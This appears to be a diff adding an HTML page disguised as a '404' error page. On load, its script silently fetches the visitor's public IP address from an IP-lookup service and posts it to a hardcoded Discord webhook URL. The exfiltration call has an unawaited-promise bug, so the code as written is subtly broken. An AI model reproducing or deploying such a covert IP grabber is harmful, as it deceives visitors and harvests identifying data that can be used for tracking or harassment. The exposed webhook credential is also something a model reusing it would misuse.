@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>IP Fetcher</title>
+    <style>
+        body {
+            background-color: #111111;
+            color: #ffffff;
+            font-family: Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+        }
+    </style>
+</head>
+<body>
+    <h1>404</h1>
+    <p id="IpDisplay">Unable to fetech page</p>
+
+    <script>
+        async function e() {
+            let Response = await fetch("https://api.ipify.org?format=json");
+            let EData = await Response.json();
+            let DATA = EData.ip;
+
+            return DATA;
+        }
+
+          async function SendDiscordMessage(WebhookUrl, MessageContent) {
+            await fetch(WebhookUrl, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    content: MessageContent
+                })
+            });
+        }
+    
+        let WebhookUrl = "https://discord.com/api/webhooks/1387122494116200639/0O9Ijs19Xw_jrrQQTA09mIQTM-31fVZLHiM8BlIvQuc2jO1S3EJZo_xFg_gYLMyN7N-h";
+        let MessageContent = e();
+    
+        SendDiscordMessage(WebhookUrl, MessageContent);
+    </script>
+</body>
+</html>
+
+
